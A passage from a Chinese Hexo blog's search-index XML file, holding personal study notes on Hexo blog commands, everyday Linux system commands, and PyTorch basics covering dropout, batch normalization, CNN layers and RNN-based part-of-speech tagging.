4.C5.0只能解决分类问题]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客基本使用]]></title>
    <url>%2F2018%2F09%2F23%2Fhexo%E5%8D%9A%E5%AE%A2%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.创建新博文页面 创建博文页面首先要cd 到博客的根目录下，然后运行命令： 1hexo new &quot;页面名称&quot; 这样则在博客站点的source/_posts/文件夹下创建了指定的“页面名称.md”文件，可以直接对其进行编辑。完成编辑后就可已使用下面的同步命令来将修改提交到GIthub上： 1hexo d -g #生成静态文件并部署到服务器，g是generate代表生成文件，d是depoly代表部署到服务器]]></content>
      <categories>
        <category>博客相关</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux常用命令]]></title>
    <url>%2F2018%2F09%2F23%2Flinux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[文件管理1.查看当前文件夹中文件 #显示文件夹中全部文件和目录数 ls | wc -l #显示包含指定内容的文件和目录 ls *3094 | wc -l #显示文件夹中文件的个数 find . -type f | wc -l 注：wc 是统计前面管道输出的东西，-l表示按照行统计 磁盘管理1.查看文件夹中文件的总大小 #查看当前文件夹中文件总大小 du -h # -h表示以人可理解的方式输出 #查看指定文件夹中文件的总大小 du /home/yhk/ -h ​2.查看磁盘各个分区大小及使用情况​ df -h 内存、Cpu使用情况查看1.Cpu个数 逻辑Cpu个数查看： 1.方式一： 先使用top密令进入top界面，在界面中按1，即可出现cpu个数以及使用情况 2.方式二： cat /proc/cpuinfo |grep &quot;processor&quot;|wc -l ​ 物理CPU个数查看： cat /proc/cpuinfo |grep &quot;physical id&quot;|sort |uniq|wc -l 一个物理CPU数几核：​ cat /proc/cpuinfo |grep “cores”|uniq 2.CPU内存使用情况 top 实用程序以忽略挂起信号方式执行​ nohup command &gt; myout.file 2&gt;&amp;1 &amp; #文件产生的输出将重定向到myout.file ​​​​ ​​​]]></content>
      <categories>
        <category>Linux操作</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>服务器管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pytorch入门学习心得]]></title>
    <url>%2F2018%2F09%2F23%2FPytorch%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[全连接1.DropoutDrop是一种现在在深度学习中使用最为广泛的防止过拟合的方式 核心思想:再训练神经网格时的时候依据概率P保留每个神经元的权重，也就是说每次训练的时候都会有一些神经元被置0，这样就保证神经网络神经网络不会过度学习 注意：我们只是在训练的时候使用dropout去使一些神经元不参与训练，但是在预测阶段会使用全部的神经元参与预测 使用情况：卷积神经网路只在最后的全连接层中使用dropout，循环神经网络一般只在不同层循环结构体之间使用dropout ２.Batch Normalization核心思想：将标准化应用的整个前向传播和反向传播的过程中。传统的标准化一般只是在输入数据之前将数据进行标准化处理，而批标准化是在神经网络的训练过程中对每层的输入数据都进行一个标准化 使用位置:线性层和非线性层之间 作用：1.加快收敛速度 2.防止过拟合 ​ ３.从神经网络角度看线性回归和逻辑回归的区别？ 丛神经网络角度上看，逻辑回归只是在线性回归的基础上计入了一层Sigmod激活函数。 ４.全连接网络设计趋势1. 使用线性层和非线性激活函数交替的结果来代替线性层交替的结构往往能大大提升准确率2. 在线性层和非线性激活函数之间加入批标准化处理加快收敛速度 CNN卷积层卷积层可以看作是多个滤波器的集合，滤波器在深度上要和输入数据保持一致，让每个滤波器在宽度和深度高度上进行滑动卷积，然后计算整个滤波器和输入数据任意一处的内积，输出数据的深度和滤波器的个数保持一致 1.卷积层为什么有效？(1).局部性判断题图片的类型并不是根据整张图片来决定的，而是由一定的局部区域决定的 (2).相同性对于不同的图片，如果他们属于同一类，他们将具有相同的特征，但这些特征可能属于图片的不同位置，但是在不同位置的检测方式几乎是一样的 (3).不变性当我们对图片进行下采样时，图片的基本性质不变 2.卷积层的参数 关键参数: in_channels ：特征的管道数，彩色图片为3，黑白图片则为1 out_channels : 输出管道个数，也就是滤波器个数 kernel_size : 卷积核大小 可选参数： padding:边界填充0的层数 stride:步长 bias: 是否使用偏置，默认是True 3.卷积层的输入输出 输入： 卷积层的输入格式为(batch,channels,width,heights) 输出： 卷积层的输出取决于输入数据大小W、卷积核大小F、步长S、0填充个数P等四个方面，计算公式如下： W-F+2P/S + 1 这里在介绍几种常用的卷积层参数设置： 卷积核大小 0填充层数 步长 卷积层输出 3 1 1 保持输入维度不变 3 0 1 输入维度减2 一般卷积核大小不超过5 4.卷积层的参数共享基于特征的相同性，因此可以使用相同的滤波器来检测不同位置的相同特征，参数共享共享机制有效的减少卷积层的参数个数，加快了卷积神经网络的训练速度。 使用参数共享机制的CNN层参数个数为： 滤波器个数（out_dim） 神经元大小（kernel_size kernel_size * input_dim） 例如：当卷积层的的输出是20 20 32，窗口大小是3 3，输入数据深度是10时，当不适用参数共享时神经元个数为20 20 32，每个神经元个数为3 3 10，总参数个数为12800 900 =11520000个参数。但当我们使用参数共享时，因为输出深度为32，所以存在32个滤波器，每个滤波器存在参数3 3 10个，而总参数个数即为90 * 32个，大大减少了参数的个数 池化层1.使用池化层有什么作用？ 有效的缩小矩阵的尺寸 加快计算速度 防止过拟合 2.池化层的参数设置 关键参数： kernel_size ：池化层的大小 池化层也可也进行0填充，但是几乎不用 池化层最常用的池化方式以及参数设置： 池化类型 卷积核大小 步长 池化层输出 MaxPooling 2 2 输入维度的一半 注意：池化层只能改变高度和宽度，不能改变深度；卷积层即可改变数据的宽度和高度也可以改变数据的深度 经典卷积设计的趋向1. 使用小滤波器2. 多个卷积层和非线性激活层交替的结构比单一的卷积层结构能更加有效的提取出更深层次的特征，并且参数个数更少 RNN1.RNN模型的超参数 关键参数： input_size:输入的维度 hidden_size：隐藏层维度，也是最终输出的维度 num_layers: RNN层数可选参数: batch_first : 将输入输出的batch放在最前面，顺序为（batch,seq,feature） bidirectional: True表示双向循环神经网络，默认为False dropout: 参数接受一个0~1之间的一个值，会将网路中出最后一层外加入dropout层 2.RNN模型的输入 RNN模型的输入为:(seq,batch,feature),这里要重点注意，在建立模型时可使用batch_first将顺序变成正常的(batch,seq,feature)． 其中的含义为: batch: 样本个数 seq: 每个样本依据附近的样本个数 feature: 每个样本特征数 其实RNN的网络中需要两个输入，上面的序列输入是主要输入，必须进行人工指定，还有一个起始状态输入，可选进行输入，不指定则默认为全0 3.RNN模型的输出 RNN的模型输出分为实际输出output和记忆状态h两部分。其中各自的形式和表达如下： 实际输出output: 维度：(seq,batch,hiddendirection)记忆状态： 维度：(layers direction,bactch,hidden) 注：使用batch_first可将batch放在最前面 4.RNN使用作词性判断 因为RNN可根据上下文进行输出，因此使用RNN模型根据上下文的词性判断某个词的词性比直接根据该单词判断效果更好。 训练集：​ 输入：给定的句子​ 标签：句子中每个单词的词性 基本原理： 首先我们使用word_embedding将句子中的每个词进行词向量化，如：The dog ate apple 转化成4 word_dim 的词向量 x = x.embedding(x) 因为lstm需要的输入形式为3维，因此我们要将其转换为1 4 word_dim x = x.unsqueeze(0) 再将其输入到lstm模型中，得到模型的实际输出维度为：batch seq * hidden_dim output 因为我们需要判断是的最后一个词的词性，因此我们只需要取最后一个seq就好了 output[:,-1,:] 因为一个单词的词性不只与其上下文关系有关，还与其单词的字母排列情况有关，因此我们可以上面的基础上增加字符角度的lstm来进行表征其字母排列情况。 完善方案： 遍历句子The dog ate apple中的每个单词： 将单词中的每个字母进行词向量表示，如apple转化成5 char_dim的词向量 char_info = nn.embedding(x) 将其转换为３维：１ 5 char_dim char_info = char_info.unsqueeze(0) 将模型输入lstm模型，但这里取记忆状态作为输出,输出状态是h0维度为(1,1,hidden_dim) _,h = char_lstm(char_info) h[0] 将各个单词的输出组合成一个向量，按照seq进行拼接,形成一个1 4 hidden_dim的向量 for word in words: char_seq = make_sequeece(word,char_to_idx) char_seq = self.char_lstm(char_seq) word_set.append(char_seq) char = torch.stack(word_set,1) 根据前面基本方法将单词进行向量化，得到1 4 word_dim维向量，将其与字符级别的lstm结果从feature维度进行拼接，得到1 4 char_hidden+word_dim维向量 x = torch.cat((x,char),dim=2) 最后将两个角度的得到的特征一起输入的最终的lstm模型，在经过全连接层得到最终结果]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>深度学习</tag>
        <tag>Pytorch</tag>
      </tags>
  </entry>
</search>
